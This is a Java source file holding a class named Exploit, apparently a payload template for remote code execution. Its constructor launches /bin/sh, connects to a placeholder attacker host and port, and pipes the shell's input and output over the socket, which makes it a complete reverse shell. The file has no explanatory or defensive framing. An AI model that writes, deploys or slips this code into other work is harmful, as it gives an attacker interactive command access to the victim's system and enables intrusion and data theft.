import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

  public Exploit() throws Exception {
    final String host = "<host>";
    final int port = <port>;
    final String shellCommand = "/bin/sh";

    final Process process = new ProcessBuilder(shellCommand).redirectErrorStream(true)
      .start();

    try (final Socket socket = new Socket(host, port)) {
      final InputStream processInputStream = process.getInputStream();
      final InputStream processErrorStream = process.getErrorStream();
      final InputStream socketInputStream = socket.getInputStream();
      final OutputStream processOutputStream = process.getOutputStream();
      final OutputStream socketOutputStream = socket.getOutputStream();

      while (!socket.isClosed()) {
        while (processInputStream.available() > 0) {
          socketOutputStream.write(processInputStream.read());
        }
        while (processErrorStream.available() > 0) {
          socketOutputStream.write(processErrorStream.read());
        }
        while (socketInputStream.available() > 0) {
          processOutputStream.write(socketInputStream.read());
        }
        socketOutputStream.flush();
        processOutputStream.flush();
        Thread.sleep(50);

        try {
          process.exitValue();
          break;
        } catch (Exception exception) {
        }
      }
      process.destroy();
    }
  }
}